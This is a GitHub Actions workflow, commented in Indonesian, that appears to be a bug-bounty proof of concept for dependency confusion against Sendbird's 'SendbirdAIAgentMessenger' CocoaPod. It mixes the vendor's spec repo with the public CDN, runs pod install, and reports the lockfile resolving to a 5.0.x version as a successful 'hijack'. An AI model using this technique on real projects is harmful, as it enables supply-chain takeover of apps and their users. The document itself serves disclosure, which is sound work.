name: Execute_PoC
on: [push, workflow_dispatch]

jobs:
  test-macos:
    runs-on: macos-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Headless Pod Test
        run: |
          mkdir -p TrialRun
          cd TrialRun
          
          # Setup Git
          git config --global user.email "researcher@test.com"
          git config --global user.name "Researcher"

          # Tulis Podfile MODE HEADLESS (Tanpa Xcode Project)
          cat <<EOF > Podfile
          # PENTING: Kita kasih tahu CocoaPods untuk gak nyari project Xcode
          install! 'cocoapods', :integrate_targets => false

          source 'https://github.com/sendbird/sendbird-ios-distribution.git'
          source 'https://cdn.cocoapods.org/'

          platform :ios, '15.0'

          target 'PoCSimulation' do
            use_frameworks!
            # Target utama pembajakan
            pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
          end
          EOF

      - name: Execution & Hijack Proof
        run: |
          cd TrialRun
          # Jalankan install dengan verbose biar keliatan alur downloadnya
          pod install --repo-update --verbose
          
          echo "--- BUKTI FINAL UNTUK TRIAGER ---"
          if [ -f Podfile.lock ]; then
            cat Podfile.lock
            if grep -q "5.0." Podfile.lock; then
              echo "✅ SUCCESS: Pod Sendbird berhasil dibajak ke versi 5.0.x!"
            else
              echo "❌ FAILED: Masih menggunakan versi resmi."
            fi
          else
            echo "❌ ERROR: Podfile.lock tidak ter-generate."
          fi
